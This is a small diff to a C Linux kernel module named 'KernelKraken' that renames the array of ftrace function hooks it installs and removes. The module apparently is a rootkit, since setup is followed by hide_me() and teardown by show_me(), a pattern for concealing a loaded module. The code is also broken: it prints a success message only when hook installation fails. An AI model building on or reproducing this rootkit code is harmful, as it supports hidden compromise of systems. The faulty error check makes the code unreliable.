@@ -7,7 +7,7 @@
 
 static int setup(void) {
     int error;
-    error = fh_install_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
+    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if (error)
             printk(KERN_INFO "KernelKraken: Initialized successfully!\n");
         return error;
@@ -16,7 +16,7 @@ hide_me();
 }
 
 static int teardown(void) {
-    fh_remove_hooks(kernel_hooks, ARRAY_SIZE(kernel_hooks));
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     show_me();
     return 0;
 }
